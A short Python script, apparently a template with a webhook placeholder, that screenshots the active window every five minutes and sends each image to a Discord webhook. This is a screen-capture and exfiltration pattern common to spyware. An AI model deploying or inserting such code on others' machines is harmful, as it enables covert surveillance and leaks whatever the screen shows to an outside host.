from discord_winhook.screenshot import SSHook

import pygetwindow as gw
hook = SSHook(
    "{webhook}",
    gw.getActiveWindow(),
)

hook.recurs(every=5*60, _block=True)
